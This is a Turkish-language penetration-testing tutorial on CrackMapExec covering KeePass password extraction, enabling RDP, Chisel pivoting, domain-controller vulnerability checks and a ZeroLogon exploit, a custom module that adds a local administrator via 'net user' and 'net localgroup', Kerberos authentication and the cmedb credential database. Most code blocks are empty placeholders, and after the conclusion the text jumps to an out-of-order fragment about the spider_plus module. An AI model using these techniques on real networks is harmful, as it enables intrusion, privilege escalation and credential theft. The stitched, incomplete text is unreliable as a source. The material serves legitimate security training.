Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

